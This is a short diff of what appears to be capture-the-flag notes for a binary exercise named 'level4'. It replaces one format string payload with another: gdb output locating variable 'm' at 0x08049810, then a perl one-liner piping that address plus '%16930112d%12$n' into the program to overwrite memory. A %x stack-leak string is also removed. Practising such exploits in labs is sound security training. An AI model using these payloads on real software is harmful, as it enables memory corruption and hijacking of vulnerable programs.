@@ -1,3 +1,8 @@
-perl -e 'print "\x44\x55\x02\x01" . "%1025540d" . "%12\$n" . "\n"' > /tmp/level4 && cat /tmp/level4 - | ./level4
+info variable
+```
+[...]
+0x08049810  m
+[...]
+```
 
-%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
+perl -e 'print "\x10\x98\x04\x08" . "%16930112d" . "%12\$n" . "\n"' > /tmp/level4 && cat /tmp/level4 | ./level4
